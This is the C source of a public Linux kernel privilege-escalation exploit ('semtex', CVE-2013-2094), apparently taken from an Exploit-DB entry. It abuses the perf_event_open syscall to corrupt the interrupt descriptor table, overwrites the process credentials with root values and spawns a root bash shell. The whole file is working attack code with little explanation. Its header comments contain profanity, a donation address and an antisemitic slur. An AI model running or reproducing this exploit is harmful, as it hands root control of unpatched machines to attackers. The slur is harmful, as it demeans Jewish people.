/*
 * linux 2.6.37-3.x.x x86_64, ~100 LOC
 * gcc-4.6 -O2 semtex.c && ./a.out
 * 2010 sd@fucksheep.org, salut!
 *
 * update may 2013:
 * seems like centos 2.6.32 backported the perf bug, lol.
 * jewgold to 115T6jzGrVMgQ2Nt1Wnua7Ch1EuL9WXT2g if you insist.
 *
 * EDB Note: Update ~ http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
 *                                 ~ https://github.com/realtalk/cve-2013-2094/blob/master/rewritten_semtex.c
 */

#define _GNU_SOURCE 1
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <syscall.h>
#include <stdint.h>
#include <assert.h>

#define BASE  0x380000000
#define SIZE  0x010000000
#define KSIZE  0x2000000
#define AB(x) ((uint64_t)((0xababababLL<<32)^((uint64_t)((x)*313337))))

void fuck() {
  int i,j,k;
  uint64_t uids[4] = { AB(2), AB(3), AB(4), AB(5) };
  uint8_t *current = *(uint8_t **)(((uint64_t)uids) & (-8192));
  uint64_t kbase = ((uint64_t)current)>>36;
  uint32_t *fixptr = (void*) AB(1);
  *fixptr = -1;

  for (i=0; i<4000; i+=4) {
    uint64_t *p = (void *)&current[i];
    uint32_t *t = (void*) p[0];
    if ((p[0] != p[1]) || ((p[0]>>36) != kbase)) continue;
    for (j=0; j<20; j++) { for (k = 0; k < 8; k++)
      if (((uint32_t*)uids)[k] != t[j+k]) goto next;
      for (i = 0; i < 8; i++) t[j+i] = 0;
      for (i = 0; i < 10; i++) t[j+9+i] = -1;
      return;
next:;    }
  }
}

void sheep(uint32_t off) {
  uint64_t buf[10] = { 0x4800000001,off,0,0,0,0x300 };
  int fd = syscall(298, buf, 0, -1, -1, 0);
  assert(!close(fd));
}


int  main() {
  uint64_t  u,g,needle, kbase, *p; uint8_t *code;
  uint32_t *map, j = 5;
  int i;
  struct {
    uint16_t limit;
    uint64_t addr;
  } __attribute__((packed)) idt;
  assert((map = mmap((void*)BASE, SIZE, 3, 0x32, 0,0)) == (void*)BASE);
  memset(map, 0, SIZE);
  sheep(-1); sheep(-2);
  for (i = 0; i < SIZE/4; i++) if (map[i]) {
    assert(map[i+1]);
    break;
  }
  assert(i<SIZE/4);
  asm ("sidt %0" : "=m" (idt));
  kbase = idt.addr & 0xff000000;
  u = getuid(); g = getgid();
  assert((code = (void*)mmap((void*)kbase, KSIZE, 7, 0x32, 0, 0)) == (void*)kbase);
  memset(code, 0x90, KSIZE); code += KSIZE-1024; memcpy(code, &fuck, 1024);
  memcpy(code-13,"\x0f\x01\xf8\xe8\5\0\0\0\x0f\x01\xf8\x48\xcf",
    printf("2.6.37-3.x x86_64\nsd@fucksheep.org 2010\n") % 27);
  setresuid(u,u,u); setresgid(g,g,g);
  while (j--) {
    needle = AB(j+1);
    assert(p = memmem(code, 1024, &needle, 8));
    if (!p) continue;
    *p = j?((g<<32)|u):(idt.addr + 0x48);
  }
  sheep(-i + (((idt.addr&0xffffffff)-0x80000000)/4) + 16);
  asm("int $0x4");  assert(!setuid(0));
  return execl("/bin/bash", "-sh", NULL);
}